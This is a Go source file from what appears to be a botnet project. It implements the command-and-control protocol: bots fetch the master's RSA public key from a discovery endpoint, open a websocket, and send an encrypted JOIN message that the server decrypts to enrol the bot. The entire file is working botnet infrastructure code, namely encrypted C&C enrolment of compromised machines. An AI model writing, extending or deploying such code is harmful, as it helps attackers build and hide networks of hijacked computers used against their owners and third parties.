package protocol

import (
	"crypto/rsa"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"time"

	"github.com/gorilla/websocket"

	"github.com/adrianosela/botnet/lib/encryption"
)

// CCDiscovery is the struct to be presented at the KeyEndpoint endpoint
type CCDiscovery struct {
	Key string `json:"key"`
}

const (
	// KeyEndpoint should be taken as a well-known discovery endpoint for this
	// botnet's command and control server
	KeyEndpoint = "/key"

	// CCEndpoint is where encrypted websocket communication takes place between
	// on the CC server
	CCEndpoint = "/"

	writeWait      = 10 * time.Second    // Time allowed to write a message to the peer
	pongWait       = 60 * time.Second    // Time allowed to read the next pong message from the peer
	pingPeriod     = (pongWait * 9) / 10 // Send pings to peer with this period. Must be less than pongWait
	maxMessageSize = 512                 // Maximum message size allowed from peer
)

func getCCPubKey(ccAddr string) (*rsa.PublicKey, string, error) {
	req, err := http.NewRequest(http.MethodGet, fmt.Sprintf("http://%s%s", ccAddr, KeyEndpoint), nil)
	if err != nil {
		return nil, "", fmt.Errorf("get cc public key NewRequest failed with: %s", err)
	}
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return nil, "", err
	}
	bodyBytes, err := ioutil.ReadAll(resp.Body)
	defer resp.Body.Close()
	if err != nil {
		return nil, "", err
	}
	var serverKey *CCDiscovery
	if err := json.Unmarshal(bodyBytes, &serverKey); err != nil {
		return nil, "", err
	}
	pubKey, err := encryption.DecodePubKeyPEM([]byte(serverKey.Key))
	if err != nil {
		return nil, "", err
	}
	return pubKey, serverKey.Key, nil
}

// BotHandshake takes a connection from a prospective bot and the master
// decryption key (in order to decrypt incoming messages from bot), and
// returns the bots public key only if it is of the expected JOIN message
// type, otherwise the handshake fails and the bot is never added to the botnet
func BotHandshake(conn *websocket.Conn, ccDecryptionKey *rsa.PrivateKey) (string, error) {
	_, encryptedBotMessage, err := conn.ReadMessage()
	if err != nil {
		if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
			return "", fmt.Errorf("WS connection was closed unexpectedly: %s", err)
		}
	}
	jsonBotMsg, err := encryption.DecryptMessage(encryptedBotMessage, ccDecryptionKey)
	if err != nil {
		return "", fmt.Errorf("could not decrypt message from new slave: %s", err)
	}
	var botMessage *Message
	if err := json.Unmarshal(jsonBotMsg, &botMessage); err != nil {
		return "", fmt.Errorf("could not unmarshal message from new slavde slave: %s", err)
	}
	if botMessage.Type != MessageTypeJoin {
		return "", fmt.Errorf("expected message type JOIN but got %s", botMessage.Type)
	}
	pubKey, ok := botMessage.Args[JoinArgBotPubKey]
	if !ok || pubKey == "" {
		return "", fmt.Errorf("expected message type JOIN but got %s", botMessage.Type)
	}
	return pubKey, nil
}

// CCHandshake is performed by bots to join a master's botnet. It takes the address of
// the C&C (Command and Control) server, the bots public key, and the
func CCHandshake(masterAddr string, botPubKey string) (*websocket.Conn, *rsa.PublicKey, error) {
	ccEncryptionKey, rawPEM, err := getCCPubKey(masterAddr)
	if err != nil {
		return nil, nil, err
	}
	log.Printf("[bot] fetched master pub key: \n%s", rawPEM)

	url := fmt.Sprintf("ws://%s%s", masterAddr, CCEndpoint)
	conn, _, err := websocket.DefaultDialer.Dial(url, nil)
	if err != nil {
		return nil, nil, fmt.Errorf("dial error: %s", err)
	}
	log.Printf("[bot] initiated websockets connection to command and control server at: %s", url)

	msgJSON, err := json.Marshal(Message{Type: MessageTypeJoin, Args: MessageArgs{
		JoinArgBotPubKey: botPubKey,
	}})
	if err != nil {
		return nil, nil, fmt.Errorf("could not marshal Message to JSON: %s", err)
	}
	encrypted, err := encryption.EncryptMessage(msgJSON, ccEncryptionKey)
	if err != nil {
		return nil, nil, fmt.Errorf("could not encrypt JSON Message: %s", err)
	}
	log.Println("[bot] built and encrypted botnet join request with master key...")

	conn.WriteMessage(websocket.BinaryMessage, []byte(encrypted))
	log.Println("[bot] sent encrypted join request to command and control server...")

	conn.SetReadLimit(maxMessageSize)
	conn.SetReadDeadline(time.Now().Add(pongWait))
	conn.SetPongHandler(func(string) error { conn.SetReadDeadline(time.Now().Add(pongWait)); return nil })
	return conn, ccEncryptionKey, nil
}
